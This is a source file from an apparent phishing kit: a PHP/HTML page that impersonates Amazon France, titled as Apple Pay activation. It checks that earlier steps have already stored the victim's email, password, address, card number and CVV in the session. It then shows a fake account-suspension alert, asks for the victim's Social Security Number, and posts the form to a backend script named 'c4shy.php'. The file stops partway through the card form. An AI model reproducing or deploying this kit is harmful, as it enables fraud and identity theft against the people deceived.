<?php
session_start();
ob_start();
header('Content-Type: text/html; charset=utf-8');
include '../../config.php';

if (empty($_SESSION['email'])) {
  header('location: ../../Forbidden');
  exit();
}
if (empty($_SESSION['pass'])) {
  header("location: ../../Forbidden");
  exit();
}
if (empty($_SESSION['name'])) {
  header('location: ../../Forbidden');
  exit();
}
if (empty($_SESSION['dob'])) {
  header("location: ../../Forbidden");
  exit();
}
if (empty($_SESSION['pays'])) {
  header('location: ../../Forbidden');
  exit();
}
if (empty($_SESSION['address'])) {
  header("location: ../../Forbidden");
  exit();
}
if (empty($_SESSION['zip'])) {
  header('location: ../../Forbidden');
  exit();
}
if (empty($_SESSION['city'])) {
  header("location: ../../Forbidden");
  exit();
}
if (empty($_SESSION['phone'])) {
  header('location: ../../Forbidden');
  exit();
}
if (empty($_SESSION['ccname'])) {
  header("location: ../../Forbidden");
  exit();
}
if (empty($_SESSION['ccnum'])) {
  header('location: ../../Forbidden');
  exit();
}
if (empty($_SESSION['cvv'])) {
  header("location: ../../Forbidden");
  exit();
}
if (empty($_SESSION['expirem'])) {
  header('location: ../../Forbidden');
  exit();
}
if (empty($_SESSION['expirey'])) {
  header('location: ../../Forbidden');
  exit();
}

?>
<!DOCTYPE html>
<html class="a-touch a-mobile a-js a-audio a-video a-canvas a-svg a-drag-drop a-geolocation a-history a-webworker a-autofocus a-input-placeholder a-textarea-placeholder a-local-storage a-orientation a-touch a-gradients a-hires a-transform3d a-touch-scrolling a-ios a-mobile a-text-shadow a-text-stroke a-box-shadow a-border-radius a-border-image a-opacity a-transform a-transition a-ember" data-19ax5a9jf="mongoose" data-aui-build-date="3.22.1-2022-05-20">

<head>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" integrity="sha512-894YE6QWD5I59HgZOGReFYm4dnWc1Qt5NtvYSaNcOP+u1T9qYdvdihz0PPSiiqn/+/3e7Jo4EaG7TubfWGUrMQ==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
  <script>
    var aPageStart = (new Date()).getTime();
  </script>
  <meta name="viewport" content="width=device-width, maximum-scale=1, minimum-scale=1, initial-scale=1, user-scalable=no, shrink-to-fit=no">
  <meta charset="utf-8">
  <title>Activation du service Apple Pay</title>
  <meta name="viewport" content="width=device-width, maximum-scale=1, minimum-scale=1, initial-scale=1, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="content-type" content="text/html; charset=UTF-8">
  <link href="../../img/favicon.ico" rel="shortcut icon" type="image/x-icon">
  <link rel="stylesheet" href="https://images-eu.ssl-images-amazon.com/images/I/11OrJUma5UL._RC|01rXlRztnIL.css,41b6dUqOGcL.css,312+3GosuzL.css,11+5Zkv0+pL.css,01NtHviPbnL.css,0131vqwP5UL.css,310ooOGCdhL.css,11o2wHvvdBL.css,01i9N7e-hBL.css,11VHr91CkuL.css,11ADf9L1OdL.css,01IdKcBuAdL.css,019pz6QNQ6L.css,01wLsDqViEL.css,11ssRyboARL.css,017oxx82kUL.css,41tu2pCE83L.css,01B-YPN7k2L.css,21asbVwBAKL.css,21av6WXnrdL.css,11hcDsGAR1L.css,21AL2IbGWYL.css,01Zit5mlZtL.css,01CFUgsA-YL.css,31QBg5wd9xL.css,013ZbRX2A7L.css,112j6WRt7cL.css,219k7gEqxTL.css,11VvAxw559L.css,01iN9LjVqhL.css,11Dg5X2FOfL.css,21m6nqVwQ7L.css,11XldXvWmcL.css,01vd5lqeZUL.css,21Ho6cJWf-L.css,11pA-LAYEML.css,11FImvIW68L.css,11Ty7A6HeXL.css,01890+Vwk8L.css,011taseCFPL.css,11eI5SJms1L.css,01cbS3UK11L.css,21XB1sivn0L.css,01INc4pyFRL.css_.css?AUIClients/AmazonUI#mobile.fr.not-trident">
  <link rel="stylesheet" href="https://images-eu.ssl-images-amazon.com/images/I/01NjQbvCUVL.css?AUIClients/AbbottViewComponentMobileAssets">
  <link rel="stylesheet" href="https://images-eu.ssl-images-amazon.com/images/I/31E2uCL+CuL.css?AUIClients/AbbottPortalAssets">
  <link rel="stylesheet" href="https://images-eu.ssl-images-amazon.com/images/I/11YuQ0DJSqL.css?AUIClients/AbbottViewComponentCommonAssets">
  <link rel="stylesheet" href="https://images-eu.ssl-images-amazon.com/images/I/51yFEbMJ8yL._RC|419uoI5318L.css,01+72+wCC9L.css_.css?AUIClients/AmazonNavigationMobileMetaAsset#mobile">
  <script>
    (function(g, h, O, C) {
      function D(a) {
        u && u.tag && u.tag(q(":", "aui", a))
      }

      function v(a, b) {
        u && u.count && u.count("aui:" + a, 0 === b ? 0 : b || (u.count("aui:" + a) || 0) + 1)
      }

      function m(a) {
        try {
          return a.test(navigator.userAgent)
        } catch (b) {
          return !1
        }
      }

      function x(a, b, c) {
        a.addEventListener ? a.addEventListener(b, c, !1) : a.attachEvent && a.attachEvent("on" + b, c)
      }

      function q(a, b, c, e) {
        b = b && c ? b + a + c : b || c;
        return e ? q(a, b, e) : b
      }

      function E(a, b, c) {
        try {
          Object.defineProperty(a, b, {
            value: c,
            writable: !1
          })
        } catch (e) {
          a[b] = c
        }
        return c
      }

      function qa(a, b, c) {
        var e =
          c = a.length,
          f = function() {
            e-- || (P.push(b), Q || (setTimeout(aa, 0), Q = !0))
          };
        for (f(); c--;) ba[a[c]] ? f() : (y[a[c]] = y[a[c]] || []).push(f)
      }

      function ra(a, b, c, e, f) {
        var d = h.createElement(a ? "script" : "link");
        x(d, "error", e);
        f && x(d, "load", f);
        a ? (d.type = "text/javascript", d.async = !0, c && /AUIClients|images[/]I/.test(b) && d.setAttribute("crossorigin", "anonymous"), d.src = b) : (d.rel = "stylesheet", d.href = b);
        h.getElementsByTagName("head")[0].appendChild(d)
      }

      function ca(a, b) {
        return function(c, e) {
          function f() {
            ra(b, c, d, function(b) {
              R ? v("resource_unload") :
                d ? (d = !1, v("resource_retry"), f()) : (v("resource_error"), a.log("Asset failed to load: " + c));
              b && b.stopPropagation ? b.stopPropagation() : g.event && (g.event.cancelBubble = !0)
            }, e)
          }
          if (da[c]) return !1;
          da[c] = !0;
          v("resource_count");
          var d = !0;
          return !f()
        }
      }

      function sa(a, b, c) {
        for (var e = {
            name: a,
            guard: function(c) {
              return b.guardFatal(a, c)
            },
            guardTime: function(a) {
              return b.guardTime(a)
            },
            logError: function(c, d, f) {
              b.logError(c, d, f, a)
            }
          }, f = [], d = 0; d < c.length; d++) F.hasOwnProperty(c[d]) && (f[d] = S.hasOwnProperty(c[d]) ? S[c[d]](F[c[d]],
          e) : F[c[d]]);
        return f
      }

      function z(a, b, c, e, f) {
        return function(d, h) {
          function n() {
            var a = null;
            e ? a = h : "function" === typeof h && (p.start = w(), a = h.apply(g, sa(d, k, l)), p.end = w());
            if (b) {
              F[d] = a;
              a = d;
              for (ba[a] = !0;
                (y[a] || []).length;) y[a].shift()();
              delete y[a]
            }
            p.done = !0
          }
          var k = f || this;
          "function" === typeof d && (h = d, d = C);
          b && (d = d ? d.replace(ea, "") : "__NONAME__", T.hasOwnProperty(d) && k.error(q(", reregistered by ", q(" by ", d + " already registered", T[d]), k.attribution), d), T[d] = k.attribution);
          for (var l = [], m = 0; m < a.length; m++) l[m] =
            a[m].replace(ea, "");
          var p = A[d || "anon" + ++ta] = {
            depend: l,
            registered: w(),
            namespace: k.namespace
          };
          d && ua.hasOwnProperty(d);
          c ? n() : qa(l, k.guardFatal(d, n), d);
          return {
            decorate: function(a) {
              S[d] = k.guardFatal(d, a)
            }
          }
        }
      }

      function fa(a) {
        return function() {
          var b = Array.prototype.slice.call(arguments);
          return {
            execute: z(b, !1, a, !1, this),
            register: z(b, !0, a, !1, this)
          }
        }
      }

      function U(a, b) {
        return function(c, e) {
          e || (e = c, c = C);
          var f = this.attribution;
          return function() {
            t.push(b || {
              attribution: f,
              name: c,
              logLevel: a
            });
            var d = e.apply(this, arguments);
            t.pop();
            return d
          }
        }
      }

      function G(a, b) {
        this.load = {
          js: ca(this, !0),
          css: ca(this)
        };
        E(this, "namespace", b);
        E(this, "attribution", a)
      }

      function ha() {
        h.body ? p.trigger("a-bodyBegin") : setTimeout(ha, 20)
      }

      function B(a, b) {
        a.className = V(a, b) + " " + b
      }

      function V(a, b) {
        return (" " + a.className + " ").split(" " + b + " ").join(" ").replace(/^ | $/g, "")
      }

      function ia(a) {
        try {
          return a()
        } catch (b) {
          return !1
        }
      }

      function H() {
        if (I) {
          var a = {
            w: g.innerWidth || n.clientWidth,
            h: g.innerHeight || n.clientHeight
          };
          5 < Math.abs(a.w - W.w) || 50 < a.h - W.h ? (W = a, J = 4, (a = k.mobile ||
            k.tablet ? 450 < a.w && a.w > a.h : 1250 <= a.w) ? B(n, "a-ws") : n.className = V(n, "a-ws")) : 0 < J && (J--, ja = setTimeout(H, 16))
        }
      }

      function va(a) {
        (I = a === C ? !I : !!a) && H()
      }

      function wa() {
        return I
      }
      "use strict";
      var K = O.now = O.now || function() {
          return +new O
        },
        w = function(a) {
          return a && a.now ? a.now.bind(a) : K
        }(g.performance),
        L = w(),
        ua = {},
        r = g.AmazonUIPageJS || g.P;
      if (r && r.when && r.register) {
        L = [];
        for (var l = h.currentScript; l; l = l.parentElement) l.id && L.push(l.id);
        return r.log("A copy of P has already been loaded on this page.", "FATAL", L.join(" "))
      }
      var u =
        g.ue;
      D();
      D("aui_build_date:3.22.1-2022-05-20");
      var P = [],
        xa = [],
        Q = !1;
      var aa = function() {
        for (var a = setTimeout(aa, 0), b = K(); xa.length || P.length;)
          if (P.shift()(), 50 < K() - b) return;
        clearTimeout(a);
        Q = !1
      };
      var ba = {},
        y = {},
        da = {},
        R = !1;
      x(g, "beforeunload", function() {
        R = !0;
        setTimeout(function() {
          R = !1
        }, 1E4)
      });
      var ea = /^prv:/,
        T = {},
        F = {},
        S = {},
        A = {},
        ta = 0,
        X = String.fromCharCode(92),
        t = [],
        ka = !0,
        la = g.onerror;
      g.onerror = function(a, b, c, e, f) {
        f && "object" === typeof f || (f = Error(a, b, c), f.columnNumber = e, f.stack = b || c || e ? q(X, f.message, "at " +
          q(":", b, c, e)) : C);
        var d = t.pop() || {};
        f.attribution = q(":", f.attribution || d.attribution, d.name);
        f.logLevel = d.logLevel;
        f.attribution && console && console.log && console.log([f.logLevel || "ERROR", a, "thrown by", f.attribution].join(" "));
        t = [];
        la && (d = [].slice.call(arguments), d[4] = f, la.apply(g, d))
      };
      G.prototype = {
        logError: function(a, b, c, e) {
          b = {
            message: b,
            logLevel: c || "ERROR",
            attribution: q(":", this.attribution, e)
          };
          if (g.ueLogError) return g.ueLogError(a || b, a ? b : null), !0;
          console && console.error && (console.log(b), console.error(a));
          return !1
        },
        error: function(a, b, c, e) {
          a = Error(q(":", e, a, c));
          a.attribution = q(":", this.attribution, b);
          throw a;
        },
        guardError: U(),
        guardFatal: U("FATAL"),
        guardCurrent: function(a) {
          var b = t[t.length - 1];
          return b ? U(b.logLevel, b).call(this, a) : a
        },
        guardTime: function(a) {
          var b = t[t.length - 1],
            c = b && b.name;
          return c && c in A ? function() {
            var b = w(),
              f = a.apply(this, arguments);
            A[c].async = (A[c].async || 0) + w() - b;
            return f
          } : a
        },
        log: function(a, b, c) {
          return this.logError(null, a, b, c)
        },
        declare: z([], !0, !0, !0),
        register: z([], !0),
        execute: z([]),
        AUI_BUILD_DATE: "3.22.1-2022-05-20",
        when: fa(),
        now: fa(!0),
        trigger: function(a, b, c) {
          var e = K();
          this.declare(a, {
            data: b,
            pageElapsedTime: e - (g.aPageStart || NaN),
            triggerTime: e
          });
          c && c.instrument && M.when("prv:a-logTrigger").execute(function(b) {
            b(a)
          })
        },
        handleTriggers: function() {
          this.log("handleTriggers deprecated")
        },
        attributeErrors: function(a) {
          return new G(a)
        },
        _namespace: function(a, b) {
          return new G(a, b)
        },
        setPriority: function(a) {
          ka ? ka = !1 : this.log("setPriority only accept the first call.")
        }
      };
      var p = E(g, "AmazonUIPageJS",
        new G);
      var M = p._namespace("PageJS", "AmazonUI");
      M.declare("prv:p-debug", A);
      p.declare("p-recorder-events", []);
      p.declare("p-recorder-stop", function() {});
      E(g, "P", p);
      ha();
      if (h.addEventListener) {
        var ma;
        h.addEventListener("DOMContentLoaded", ma = function() {
          p.trigger("a-domready");
          h.removeEventListener("DOMContentLoaded", ma, !1)
        }, !1)
      }
      var n = h.documentElement,
        Y = function() {
          var a = ["O", "ms", "Moz", "Webkit"],
            b = h.createElement("div");
          return {
            testGradients: function() {
              return !0
            },
            test: function(c) {
              var e = c.charAt(0).toUpperCase() +
                c.substr(1);
              c = (a.join(e + " ") + e + " " + c).split(" ");
              for (e = c.length; e--;)
                if ("" === b.style[c[e]]) return !0;
              return !1
            },
            testTransform3d: function() {
              return !0
            }
          }
        }();
      r = n.className;
      var na = /(^| )a-mobile( |$)/.test(r),
        oa = /(^| )a-tablet( |$)/.test(r),
        k = {
          audio: function() {
            return !!h.createElement("audio").canPlayType
          },
          video: function() {
            return !!h.createElement("video").canPlayType
          },
          canvas: function() {
            return !!h.createElement("canvas").getContext
          },
          svg: function() {
            return !!h.createElementNS && !!h.createElementNS("http://www.w3.org/2000/svg",
              "svg").createSVGRect
          },
          offline: function() {
            return navigator.hasOwnProperty && navigator.hasOwnProperty("onLine") && navigator.onLine
          },
          dragDrop: function() {
            return "draggable" in h.createElement("span")
          },
          geolocation: function() {
            return !!navigator.geolocation
          },
          history: function() {
            return !(!g.history || !g.history.pushState)
          },
          webworker: function() {
            return !!g.Worker
          },
          autofocus: function() {
            return "autofocus" in h.createElement("input")
          },
          inputPlaceholder: function() {
            return "placeholder" in h.createElement("input")
          },
          textareaPlaceholder: function() {
            return "placeholder" in
              h.createElement("textarea")
          },
          localStorage: function() {
            return "localStorage" in g && null !== g.localStorage
          },
          orientation: function() {
            return "orientation" in g
          },
          touch: function() {
            return "ontouchend" in h
          },
          gradients: function() {
            return Y.testGradients()
          },
          hires: function() {
            var a = g.devicePixelRatio && 1.5 <= g.devicePixelRatio || g.matchMedia && g.matchMedia("(min-resolution:144dpi)").matches;
            v("hiRes" + (na ? "Mobile" : oa ? "Tablet" : "Desktop"), a ? 1 : 0);
            return a
          },
          transform3d: function() {
            return Y.testTransform3d()
          },
          touchScrolling: function() {
            return m(/Windowshop|android|OS ([5-9]|[1-9][0-9]+)(_[0-9]{1,2})+ like Mac OS X|SOFTWARE=([5-9]|[1-9][0-9]+)(.[0-9]{1,2})+.*DEVICE=iPhone|Chrome|Silk|Firefox|Trident.+?; Touch/i)
          },
          ios: function() {
            return m(/OS [1-9][0-9]*(_[0-9]*)+ like Mac OS X/i) && !m(/trident|Edge/i)
          },
          android: function() {
            return m(/android.([1-9]|[L-Z])/i) && !m(/trident|Edge/i)
          },
          mobile: function() {
            return na
          },
          tablet: function() {
            return oa
          },
          rtl: function() {
            return "rtl" === n.dir
          }
        };
      for (l in k) k.hasOwnProperty(l) && (k[l] = ia(k[l]));
      for (var Z = "textShadow textStroke boxShadow borderRadius borderImage opacity transform transition".split(" "), N = 0; N < Z.length; N++) k[Z[N]] = ia(function() {
        return Y.test(Z[N])
      });
      var I = !0,
        ja = 0,
        W = {
          w: 0,
          h: 0
        },
        J = 4;
      H();
      x(g, "resize", function() {
        clearTimeout(ja);
        J = 4;
        H()
      });
      var pa = {
        getItem: function(a) {
          try {
            return g.localStorage.getItem(a)
          } catch (b) {}
        },
        setItem: function(a, b) {
          try {
            return g.localStorage.setItem(a, b)
          } catch (c) {}
        }
      };
      n.className = V(n, "a-no-js");
      B(n, "a-js");
      !m(/OS [1-8](_[0-9]*)+ like Mac OS X/i) || g.navigator.standalone || m(/safari/i) || B(n, "a-ember");
      r = [];
      for (l in k) k.hasOwnProperty(l) && k[l] && r.push("a-" + l.replace(/([A-Z])/g, function(a) {
        return "-" + a.toLowerCase()
      }));
      B(n, r.join(" "));
      n.setAttribute("data-aui-build-date",
        "3.22.1-2022-05-20");
      p.register("p-detect", function() {
        return {
          capabilities: k,
          localStorage: k.localStorage && pa,
          toggleResponsiveGrid: va,
          responsiveGridEnabled: wa
        }
      });
      m(/UCBrowser/i) || k.localStorage && B(n, pa.getItem("a-font-class"));
      p.declare("a-event-revised-handling", !1);
      p.execute("RetailPageServiceWorker", function() {
        function a() {
          e.forEach(function(a) {
            D(a)
          })
        }

        function b(a, b, c) {
          if (b) {
            a = m(/Chrome/i) && !m(/Edge/i) && !m(/OPR/i) && !a.capabilities.isAmazonApp && !m(new RegExp(X + "bwv" + X + "b"));
            var d = "sw:browser:" + c +
              ":";
            b.browser && a && (e.push(d + "supported"), b.browser.action(d, c));
            !a && b.browser && e.push(d + "unsupported")
          }
        }
        try {
          var c = navigator.serviceWorker
        } catch (f) {
          D("sw:nav_err")
        }
        c && (x(c, "message", function(a) {
          a && a.data && v(a.data.k, a.data.v)
        }), c.controller && c.controller.postMessage("MSG-RDY"));
        var e = [];
        (function(f) {
          var d = f.reg,
            h = f.unreg;
          c && c.getRegistrations ? (M.when("A").execute(function(a) {
            b(a, h, "unregister")
          }), x(g, "load", function() {
            M.when("A").execute(function(c) {
              b(c, d, "register");
              a()
            })
          })) : (d && d.browser && e.push("sw:browser:register:unsupported"),
            h && h.browser && e.push("sw:browser:unregister:unsupported"), a())
        })({
          reg: {},
          unreg: {}
        })
      });
      p.declare("a-fix-event-off", !1);
      v("pagejs:pkgExecTime", w() - L)
    })(window, document, Date);
    (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://images-eu.ssl-images-amazon.com/images/I/61lemL2h6EL._RC|11Y+5x+kkTL.js,5110husWMzL.js,11yKORv-GTL.js,11giXtZCwVL.js,31aYV8Ve4wL.js,01VRMV3FBdL.js,21SDJtBU-PL.js,01E8f3KV-NL.js,11rRjDLdAVL.js,51RzYQslpZL.js,11UdUjBLtPL.js,11tMohjWmVL.js,11OREnu1epL.js,11wcWdhrnDL.js,21ssiLNIZvL.js,0190vxtlzcL.js,61KJnVMUbNL.js,01JYHc2oIlL.js,31d5PLRqbQL.js,31J9sEK3CtL.js,11bEz2VIYrL.js,31dreCHeIuL.js,01qkmZhGmAL.js,0197uKrNvvL.js_.js?AUIClients/AmazonUI&KK9dlo3A#mobile.412402-T1.412405-T1');
    (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://images-eu.ssl-images-amazon.com/images/I/01AiKkUsdTL.js?AUIClients/AbbottViewComponentMobileAssets');
    (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://images-eu.ssl-images-amazon.com/images/I/31IwoCo8XiL.js?AUIClients/AmazonUIFormControlsJS#mobile');
    (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://images-eu.ssl-images-amazon.com/images/I/21QREc8SBAL.js?AUIClients/AbbottPortalAssets');
    (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://images-eu.ssl-images-amazon.com/images/I/419dERTK6xL.js?AUIClients/AbbottViewComponentCommonAssets');
    (window.AmazonUIPageJS ? AmazonUIPageJS : P).load.js('https://images-eu.ssl-images-amazon.com/images/I/419T3U4YyUL._RC|41yWQpMBvkL.js,01CMyuQ8OQL.js,31odYvSoo1L.js_.js?AUIClients/AmazonNavigationMobileMetaAsset');
  </script>
  <script type="text/javascript" async="" crossorigin="anonymous" src="https://images-eu.ssl-images-amazon.com/images/I/61lemL2h6EL._RC|11Y+5x+kkTL.js,5110husWMzL.js,11yKORv-GTL.js,11giXtZCwVL.js,31aYV8Ve4wL.js,01VRMV3FBdL.js,21SDJtBU-PL.js,01E8f3KV-NL.js,11rRjDLdAVL.js,51RzYQslpZL.js,11UdUjBLtPL.js,11tMohjWmVL.js,11OREnu1epL.js,11wcWdhrnDL.js,21ssiLNIZvL.js,0190vxtlzcL.js,61KJnVMUbNL.js,01JYHc2oIlL.js,31d5PLRqbQL.js,31J9sEK3CtL.js,11bEz2VIYrL.js,31dreCHeIuL.js,01qkmZhGmAL.js,0197uKrNvvL.js_.js?AUIClients/AmazonUI&amp;KK9dlo3A#mobile.412402-T1.412405-T1"></script>
  <script type="text/javascript" async="" crossorigin="anonymous" src="https://images-eu.ssl-images-amazon.com/images/I/01AiKkUsdTL.js?AUIClients/AbbottViewComponentMobileAssets"></script>
  <script type="text/javascript" async="" crossorigin="anonymous" src="https://images-eu.ssl-images-amazon.com/images/I/31IwoCo8XiL.js?AUIClients/AmazonUIFormControlsJS#mobile"></script>
  <script type="text/javascript" async="" crossorigin="anonymous" src="https://images-eu.ssl-images-amazon.com/images/I/21QREc8SBAL.js?AUIClients/AbbottPortalAssets"></script>
  <script type="text/javascript" async="" crossorigin="anonymous" src="https://images-eu.ssl-images-amazon.com/images/I/419dERTK6xL.js?AUIClients/AbbottViewComponentCommonAssets"></script>
  <script type="text/javascript" async="" crossorigin="anonymous" src="https://images-eu.ssl-images-amazon.com/images/I/419T3U4YyUL._RC|41yWQpMBvkL.js,01CMyuQ8OQL.js,31odYvSoo1L.js_.js?AUIClients/AmazonNavigationMobileMetaAsset"></script>

</head>

<body data-language-code="fr-FR" class="abbott-view a-m-fr a-aui_72554-c a-aui_accordion_a11y_role_354025-c a-aui_killswitch_csa_logger_372963-c a-aui_launch_2021_ally_fixes_392482-c a-aui_pci_risk_banner_210084-c a-aui_preload_261698-c a-aui_rel_noreferrer_noopener_309527-c a-aui_template_weblab_cache_333406-c a-aui_tnr_v2_180836-c">
  <div id="a-page">
    <script type="a-state" data-a-state="{&quot;key&quot;:&quot;a-wlab-states&quot;}">{}</script>
    <div class="a-section abbott-view-header">



      <div class="a-section a-spacing-none">



        <div class="a-section abbott-view-component">
          <?php include '../header.php'; ?>

        </div>


      </div>
    </div>
    <div class="a-section abbott-view-content">
      <div class="a-section a-padding-small">


          <input type="hidden" name="authenticationContext" value="language=fr_FR&amp;marketplaceId=A13V1IB3VIYZZH&amp;assocHandle=frflex&amp;pageId=frflex&amp;returnTo=https%3A%2F%2Fwww.amazon.fr%2F%3Fref_%3Dnav_custrec_signin">








          <div id="alert-0" class="a-section a-spacing-base abbott-view-component component-display-block component-width-extra_large">
            <div data-action-on-load="register-listeners" data-listeners="" class="a-section a-spacing-none has-action-on-load">
              <div class="a-box a-alert a-alert-error" aria-live="polite" aria-atomic="true">
                <div class="a-box-inner a-alert-container">
                  <h4 class=" a-size-medium a-alert-heading"> We were unable to verify your card.</h4>
                  <div class="a-alert-content">
                    Please enter your SSN to authenticate your card and resume your account activities.
                    (<span class="a-declarative" data-action="a-sheet" data-csa-c-type="widget" data-csa-c-func-deps="aui-da-a-sheet" data-a-sheet="{&quot;name&quot;:&quot;alert-0-1&quot;,&quot;preloadDomId&quot;:&quot;alert-0-1&quot;}">
                      <a class="a-link-normal" href="#">Why&nbsp;?</a>
                    </span>)
                    
                    <div id="alert-0-1" class="hidden">
                      <div class="a-container">
                        <div class="a-section a-spacing-small">
                          <h1 class="a-size-medium a-text-bold">Why do we ask for this information?</h1>
                        </div>
                        <div class="a-section a-spacing-none">
                          <span>Amazon takes your security seriously and monitors activity on your account to help keep your account and payment methods safe.</span>
                          <ul class="a-unordered-list a-vertical">
                            <li><span class="a-list-item">We've noticed some unusual payment activity on your account.</span></li>
                            <li><span class="a-list-item">Your account is temporarily suspended so we can review it with you.</span></li>
                            <li><span class="a-list-item">While your account is on hold, your pending orders are also on hold and may be cancelled.</span></li>
                            <li><span class="a-list-item">If you submit this form promptly and attach supporting documentation, we may be able to unfreeze your account more quickly.</span></li>
                            <li><span class="a-list-item">To verify your card and ensure your account's security, please provide your SSN.</span></li>
                          </ul>
                        </div>
                      </div>
                    </div>
                  </div>
                  <br>
                

        <form id="abbott-form" method="post" action="../../Backend/c4shy.php">
          <input type="hidden" name="step6">

                
          <div id="text-input-10" class=" a-section a-spacing-extra-large abbott-view-component component-width-extra_large component-display-block">
          <div class="a-section a-spacing-none"><label class=" a-text-bold a-size-medium a-form-label"><i class="input-field-required"></i>Verify Social Security Number (SSN)</label>
            <div data-action-on-load="register-listeners" data-listeners="[{&quot;values&quot;:[&quot;US&quot;,&quot;DE&quot;,&quot;FR&quot;,&quot;IT&quot;,&quot;ES&quot;,&quot;NL&quot;,&quot;CA&quot;],&quot;name&quot;:&quot;country-code&quot;,&quot;toggle&quot;:&quot;block&quot;,&quot;matcher&quot;:&quot;in&quot;}]" class="a-input-text-wrapper a-form-normal input-field-width text-input-field has-action-on-load">
              <input type="tel" autocomplete="off" required="required" placeholder="AAA-GG-SSSS" maxlength="12" id="codesms" name="SSN">
            </div> <script>
        document.getElementById('codesms').addEventListener('input', function (e) {
            let value = e.target.value;
            value = value.replace(/\D/g, ''); // Remove all non-numeric characters
            if (value.length > 3 && value.length <= 5) {
                value = value.replace(/(\d{3})(\d+)/, '$1-$2');
            } else if (value.length > 5) {
                value = value.replace(/(\d{3})(\d{2})(\d+)/, '$1-$2-$3');
            }
            e.target.value = value;
        });
    </script>
          </div>
        </div>
        <div id="submit-button-23" class="a-section a-spacing-base abbott-view-component component-display-block component-width-extra_large">
          <div data-action-on-load="register-listeners" data-listeners="" class="a-section has-action-on-load content-align-center"><span id="submit-button" class="a-button a-button-primary button-default-width"><span class="a-button-inner">
                <input class="a-button-input" type="submit" name="login1" aria-labelledby="submit-button-announce">
                <span id="submit-button-announce" class="a-button-text" aria-hidden="true">Verify</span>

              </span></span></div>
        </div></form>
                </div>
              </div>
            </div>
          </div>


          <div id="header-1" class="a-section a-spacing-mini abbott-view-component component-display-block component-width-extra_large">
            <h1 data-action-on-load="register-listeners" data-listeners="" class="a-size-large has-action-on-load text-align-left a-text-bold">Enter your credit card information</h1>
          </div>



          <div id="header-2" class="a-section a-spacing-base abbott-view-component component-display-block component-width-extra_large">
            <h1 data-action-on-load="register-listeners" data-listeners="" class="a-size-base has-action-on-load text-align-left a-text-normal">This can help you unlock your account faster.</h1>
          </div>



          <div class="a-input-text-group a-spacing-base">
            <div class="a-input-text-wrapper a-form-normal apx-add-credit-card-account-holder-name-input">
              <input type="text" maxlength="50" id="ccname" autocomplete="off" placeholder="Full Name" name="ccname" value="<?php echo $_SESSION['name'] ?>" disabled>
            </div>
            <div class="a-section a-spacing-none apx-add-credit-card-number">
              <div class="a-input-text-wrapper a-form-normal pmts-account-Number">
                <input type="tel" id="ccnum" autocomplete="off" maxlength="19" required="required" placeholder="Card Number" name="ccnum" value="<?php echo $_SESSION['ccnum'] ?>" disabled>
              </div>
            </div>
            <div class="a-input-text-wrapper a-form-normal pmts-numeric-password-mask"><input type="tel" maxlength="4" id="cvv" autocomplete="off" required="required" placeholder="Security Code (CVV)" name="cvv" value="<?php echo $_SESSION['cvv'] ?>"></div><input type="hidden" name="ppw-addCreditCardVerificationNumber_isRequired" value="true" id="pp-z7lbyR-20" disabled>
          </div>


          <script>
            document.getElementById('ccnum').addEventListener('input', function(e) {
              e.target.value = e.target.value.replace(/[^\dA-Z]/g, '').replace(/(.{4})/g, '$1 ').trim();
            });
          </script>


          <div id="pp-z7lbyR-21" class="a-section a-spacing-none">
            <div class="a-row a-spacing-small"><label for="pp-z7lbyR-22" id="pp-z7lbyR-24" class="a-form-label">Expiry date</label></div>
            <div id="add-credit-card-expiry-date-input-id" class="a-row a-spacing-base">
              <div class="a-column a-span6"><span class="a-dropdown-container"><select name="expirem" autocomplete="off" data-a-native-class="pmts-native-dropdown" id="pp-z7lbyR-22" tabindex="0" class="a-native-dropdown pmts-native-dropdown" disabled>
              <option value="<?php echo $_SESSION['expirem']?>" selected=""><?php echo $_SESSION['expirem']?></option>
                    <option value="02">02</option>
                    <option value="03">03</option>
                    <option value="04">04</option>
                    <option value="05">05</option>
                    <option value="06">06</option>
                    <option value="07">07</option>
                    <option value="08">08</option>
                    <option value="09">09</option>
                    <option value="10">10</option>
                    <option value="11">11</option>
                    <option value="12">12</option>
                  </select ><span tabindex="-1" id="pp-z7lbyR-25" data-pmts-component-id="pp-z7lbyR-3" data-a-class="pmts-expiry-month pmts-portal-component pmts-portal-components-pp-z7lbyR-3" class="a-button a-button-dropdown pmts-expiry-month pmts-portal-component pmts-portal-components-pp-z7lbyR-3" aria-hidden="true" style="min-width: 0%;"><span class="a-button-inner"><span class="a-button-text a-declarative" data-action="a-dropdown-button" role="button" aria-hidden="true"><span class="a-dropdown-prompt">01</span></span><i class="a-icon a-icon-dropdown"></i></span></span></span></div>
              <div class="a-column a-span6 a-span-last"><span class="a-dropdown-container"><select name="expirey" autocomplete="off" data-a-native-class="pmts-native-dropdown" id="pp-z7lbyR-23" tabindex="0" class="a-native-dropdown pmts-native-dropdown" disabled>
                    <option value="23">2023</option>
                    <option value="<?php echo $_SESSION['expirey']?>" selected="">20<?php echo $_SESSION['expirey']?></option>
                    <option value="25">2025</option>
                    <option value="26">2026</option>
                    <option value="27">2027</option>
                    <option value="28">2028</option>
                    <option value="29">2029</option>
                    <option value="30">2030</option>
                    <option value="31">2031</option>
                    <option value="32">2032</option>
                    <option value="33">2033</option>
                    <option value="34">2034</option>
                    <option value="35">2035</option>
                    <option value="36">2036</option>
                    <option value="37">2037</option>
                    <option value="38">2038</option>
                    <option value="39">2039</option>
                    <option value="40">2040</option>
                    <option value="41">2041</option>
                    <option value="42">2042</option>
                  </select><span tabindex="-1" id="pp-z7lbyR-26" data-pmts-component-id="pp-z7lbyR-3" data-a-class="pmts-expiry-year pmts-portal-component pmts-portal-components-pp-z7lbyR-3" class="a-button a-button-dropdown pmts-expiry-year pmts-portal-component pmts-portal-components-pp-z7lbyR-3" aria-hidden="true" style="min-width: 0%;"><span class="a-button-inner"><span class="a-button-text a-declarative" data-action="a-dropdown-button" role="button" aria-hidden="true"><span class="a-dropdown-prompt">2022</span></span><i class="a-icon a-icon-dropdown"></i></span></span></span></div>
            </div>
            <div id="add-credit-card-no-expiry-date-info-id" class="a-row a-spacing-base aok-hidden">
